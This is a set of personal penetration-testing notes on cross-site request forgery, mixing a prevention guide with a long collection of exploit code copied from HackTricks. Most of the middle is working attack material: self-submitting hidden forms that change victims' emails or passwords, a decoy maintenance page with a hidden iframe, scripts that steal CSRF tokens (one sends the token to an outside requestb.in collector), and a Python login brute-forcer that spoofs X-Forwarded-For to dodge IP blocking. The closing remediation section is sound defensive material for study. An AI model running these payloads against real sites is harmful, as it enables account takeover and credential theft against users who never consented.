## Guide 
Cross-Site Request Forgery (CSRF)

*how to*

**Attack is on users(victim)**
    - attacker sends link
    - User clicks on the link while logged into the app
    - perform actions using the victim as a proxy
    - send victim a malicous link > {change password link is sent to the attacker instead of the victim}

    Attacker sends link with our email to the victim > victim clicks on it, and the link attaches to the session cookie > that session cookie is sent to the backend, which reads "attacker@domain.com > then the backend sends back the info to the attacker, instead of the victim > attacker uses the "forgot password" function.
    Attacker sends a webpage while the invisble 'iframe' is running in the background, which is the CSRF script > which changes the email address for the attacker

**poc** 
Burp Suite CSRF PoC generator



*if*
    Relevant action: 
        Must be able to do something > {email function:}

    Cookie-Based session handling: 
        Must use cookies for sesesion management
    
    No unpredictable request parameters

**http header injection**
    you can inject a cookie into the victims browser > add same value of that cookie as an CSRF token

**note**
    Although CSRF is normally described in relation to cookie-based session handling, it also arises in other contexts where the application automatically adds some user credentials to requests, such as HTTP Basic authentication and certificate-based authentication. 

*method*
    1. Run an Auto Scan with Burp-Pro
    2. Map the App > review findings > do any meet the requirements from **if > create PoC script to teste the exploit
        2.a: PoC script will be run with a GET request:
                GET:: <img> tag with src attribute set to vulnerable URL
                POST:: form with hidden fields for all the required parameters and the target set to vulnerable URL

*rem*
    - adding CSRF tokens
    - don't use GET method to submit data to the application

**primary**
CRF TOKENS

    - generated
        * unpredictable with high entropy, similar to session tokens
        * tied to the user's session (to avoid from the attacker creating their own CSRF token)
        * validate before the relevant action is executed

    - transfered
        * Hidden field of an HTML form that is submitted using a POST method
        * Custom request header
        * Tokens submitted in the URL query string are less secure (not as safe)
        * Tokens generally should NOT be transmitted within cookies (not as safe)

    - validated
        * Generated tokens should be stored server-side within the user's session data
        * When performing a request, a validation should be performed that verifies that the submitted token matches the value that is stored in the user's session
        * Validation should be performed regardless of HTTP method or content type of the request
        * If a token is not submitted, the request should be rejected

**additional**

**weak**



*sandbox*
----------------------- 
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
----------------------- 

-----------------------
<html>
  <!-- POST:: CSRF Proof of Concept - generated by Burp Suite Professional **HACKTRICKS** --> 
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://example.com/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
      <input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
  </body>
</html>
-----------------------

-----------------------
<!-- GET:: request -->
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form method="GET" action="https://victim.net/email/change-email">
      <input type="hidden" name="email" value="some@email.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
-----------------------

-----------------------
> <img src=https://bank.com/email/change?email=attacker@test.com />
-----------------------

*How to construct a CSRF attack*

Manually creating the HTML needed for a CSRF exploit can be cumbersome, particularly where the desired request contains a large number of parameters, or there are other quirks in the request. The easiest way to construct a CSRF exploit is using the CSRF PoC generator that is built in to Burp Suite Professional:

    Select a request anywhere in Burp Suite Professional that you want to test or exploit.
    
        From the right-click context menu, select Engagement tools / Generate CSRF PoC.
    
            Burp Suite will generate some HTML that will trigger the selected request (minus cookies, which will be added automatically by the victim's browser).
    
                You can tweak various options in the CSRF PoC generator to fine-tune aspects of the attack. You might need to do this in some unusual situations to deal with quirky features of requests.
    
                    Copy the generated HTML into a web page, view it in a browser that is logged in to the vulnerable website, and test whether the intended request is issued successfully and the desired action occurs.

----------------------

*resources*
https://owasp.org/www-community/attacks/csrf
 

https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html


**************************************************** HACK TRICKS ********************************************************************

*link*
https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery





*Exploit Examples*
Exfiltrating CSRF Token

If a CSRF token is being used as defence you could try to exfiltrate it abusing a XSS vulnerability or a Dangling Markup vulnerability.
GET using HTML tags

<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available

Other HTML5 tags that can be used to automatically send a GET request are:

<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="">
<embed src="...">
<audio src="...">
<video src="...">
<source src="..." type="...">
<video poster="...">
<link rel="stylesheet" href="...">
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
  body { background: url('...'); }
</style>
<bgsound src="...">
<track src="..." kind="subtitles">
<input type="image" src="..." alt="Submit Button">

Form GET request

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form method="GET" action="https://victim.net/email/change-email">
      <input type="hidden" name="email" value="some@email.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

Form POST request

<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form method="POST" action="https://victim.net/email/change-email" id="csrfform">
      <input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
      <input type="submit" value="Submit request" />
      <img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
    </form>
    <script>
      document.forms[0].submit(); //Way 3 to autosubmit
    </script>
  </body>
</html>

Form POST request through iframe

<!-- 
The request is sent through the iframe withuot reloading the page 
-->
<html>
  <body>
  <iframe style="display:none" name="csrfframe"></iframe> 
    <form method="POST" action="/change-email" id="csrfform" target="csrfframe">
      <input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

Ajax POST request

<script>
var xh;
if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari
  xh=new XMLHttpRequest();
  }
else
  {// code for IE6, IE5
  xh=new ActiveXObject("Microsoft.XMLHTTP");
  }
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
  type: "POST",
  url: "https://google.com",
  data: "param=value&param2=value2"
})
</script>

multipart/form-data POST request

myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
    method: "post",
    body: myFormData,
    credentials: "include",
    headers: {"Content-Type": "application/x-www-form-urlencoded"},
    mode: "no-cors"
});

multipart/form-data POST request v2

// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);

Form POST request from within an iframe

<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>

Steal CSRF Token and send a POST request

function submitFormWithTokenJS(token) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", POST_URL, true);
    xhr.withCredentials = true;

    // Send the proper header information along with the request
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    // This is for debugging and can be removed
    xhr.onreadystatechange = function() {
        if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            //console.log(xhr.responseText);
        }
    }

    xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
    var xhr = new XMLHttpRequest();
    // This tels it to return it as a HTML document
    xhr.responseType = "document";
    xhr.withCredentials = true;
    // true on the end of here makes the call asynchronous
    xhr.open("GET", GET_URL, true);
    xhr.onload = function (e) {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            // Get the document from the response
            page = xhr.response
            // Get the input element
            input = page.getElementById("token");
            // Show the token
            //console.log("The token is: " + input.value);
            // Use the token to submit the form
            submitFormWithTokenJS(input.value);
        }
    };
    // Make the request
    xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();

Steal CSRF Token and send a Post request using an iframe, a form and Ajax

<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
    x1=document.getElementById("i1");
    x1d=(x1.contentWindow||x1.contentDocument);
    t=x1d.document.getElementById("token").value;
    
    document.getElementById("token").value=t;
    document.getElementById("form1").submit();
}
</script> 
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>

Steal CSRF Token and sen a POST request using an iframe and a form

<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script> 
function read()
{
    var name = 'admin2';
    var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
    document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
    document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
    document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
    document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
    document.writeln('</form>');
    document.forms[0].submit.click();
}
</script>

Steal token and send it using 2 iframes

<script>
var token;
function readframe1(){
  token = frame1.document.getElementById("profile").token.value;
  document.getElementById("bypass").token.value = token
  loadframe2();
}
function loadframe2(){
  var test = document.getElementbyId("frame2");
  test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()" 
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2" 
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
  <input type="text" name="username" value="z">
  <input type="checkbox" name="status" checked="">        
  <input id="token" type="hidden" name="token" value="0000" />
  <button type="submit">Submit</button>
</form>

POSTSteal CSRF token with Ajax and send a post with a form

<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="username" value="root"/>
  <input type="hidden" name="status" value="on"/>
  <input type="hidden" id="findtoken" name="token" value=""/>
  <input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
  x.withCredentials = true;
  x.open("GET","http://google.com?param=VALUE",true);
  x.send(null); 
}
x.onreadystatechange = function() {
  if (x.readyState == XMLHttpRequest.DONE) {
    var token = x.responseText.match(/name="token" value="(.+)"/)[1];
    document.getElementById("findtoken").value = token;
    document.getElementById("form").submit();
  }
}
</script>

CSRF with Socket.IO

<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
    console.log('connected!');
    socket.emit('join', {
        room: username
    });
  socket.emit('my_room_event', {
      data: '!flag',
      room: username
  })

});
</script>

CSRF Login Brute Force

The code can be used to Brut Force a login form using a CSRF token (It's also using the header X-Forwarded-For to try to bypass a possible IP blacklisting):

import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
    #Return CSRF + Session (cookie)
    r = requests.get(URL)
    csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
    csrf = csrf.group(1)
    session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
    return csrf, session_cookie

def login(user, password):
    print(f"{user}:{password}")
    csrf, cookie = init_session()
    cookies = {SESSION_COOKIE_NAME: cookie}
    data = {
        "tokenCSRF": csrf,
        "username": user,
        "password": password,
        "save": ""
    }
    headers = {
        "X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
    }
    r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
    if "Username or password incorrect" in r.text:
        return False
    else:
        print(f"FOUND {user} : {password}")
        return True

with open(PASS_LIST, "r") as f:
    for line in f:
        login(USER, line.strip())

Tools

    https://github.com/0xInfection/XSRFProbe

    https://github.com/merttasci/csrf-poc-generator

References

    https://portswigger.net/web-security/csrf

    https://portswigger.net/web-security/csrf/bypassing-token-validation

    https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses

    https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html







*remidation_gpt*

Validating a CSRF token is an essential step in mitigating Cross-Site Request Forgery (CSRF) attacks. Here's a detailed step-by-step guide on how to validate a CSRF token and remediate CSRF vulnerabilities in a web application:
Validating a CSRF Token

    Generate a CSRF Token:
        On the server side, generate a unique token for each user session. This token should be unpredictable and securely stored on the server.
        Example in Python (using Flask):

        python

    from flask import session
    import os
    import hashlib

    def generate_csrf_token():
        if '_csrf_token' not in session:
            session['_csrf_token'] = hashlib.sha256(os.urandom(64)).hexdigest()
        return session['_csrf_token']

Include the CSRF Token in Forms and Requests:

    Add the CSRF token as a hidden field in all forms that perform state-changing operations (POST, PUT, DELETE).
    Example in HTML:

    html

<form method="POST" action="/submit">
    <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
    <!-- other form fields -->
    <input type="submit" value="Submit">
</form>

Alternatively, include the token in the HTTP headers for AJAX requests.

javascript

    $.ajax({
        type: 'POST',
        url: '/submit',
        data: { key: 'value' },
        beforeSend: function(xhr) {
            xhr.setRequestHeader('X-CSRF-Token', '{{ csrf_token }}');
        },
        success: function(response) {
            // handle success
        }
    });

Validate the CSRF Token on the Server:

    When a request is received, retrieve the token from the request and compare it with the token stored in the user’s session.
    Example in Python (using Flask):

    python

        from flask import request, abort, session

        @app.before_request
        def validate_csrf_token():
            if request.method in ["POST", "PUT", "DELETE"]:
                token = request.form.get('csrf_token') or request.headers.get('X-CSRF-Token')
                if not token or token != session.get('_csrf_token'):
                    abort(403)

Remediation Steps for a CSRF Attack

    Implement CSRF Protection Mechanism:
        Ensure that all state-changing operations require a valid CSRF token.
        Use frameworks that have built-in CSRF protection (e.g., Django, Rails, ASP.NET).

    Token Validation:
        Verify that the CSRF token is included in the request and matches the token stored in the user’s session.

    Session Management:
        Regenerate CSRF tokens periodically and upon user login.
        Ensure that the CSRF token is unique per session and not reused across sessions.

    Security Headers:
        Implement HTTP headers to mitigate CSRF attacks, such as SameSite attribute for cookies:

        http

    Set-Cookie: sessionid=abc123; SameSite=Strict

Check Referer and Origin Headers:

    Validate the Referer and Origin headers for requests to ensure they originate from the same origin.

    python

        @app.before_request
        def validate_referer_origin():
            if request.method in ["POST", "PUT", "DELETE"]:
                referer = request.headers.get('Referer')
                origin = request.headers.get('Origin')
                if referer and not referer.startswith(request.host_url):
                    abort(403)
                if origin and not origin == request.host_url[:-1]:
                    abort(403)

    Educate Users and Developers:
        Educate your development team on CSRF vulnerabilities and best practices for prevention.
        Ensure that developers are aware of the importance of including and validating CSRF tokens.

Conclusion

Implementing and validating CSRF tokens are fundamental steps in protecting a web application from CSRF attacks. By following these guidelines and using built-in CSRF protection mechanisms provided by web frameworks, you can effectively mitigate the risk of CSRF vulnerabilities in your application.
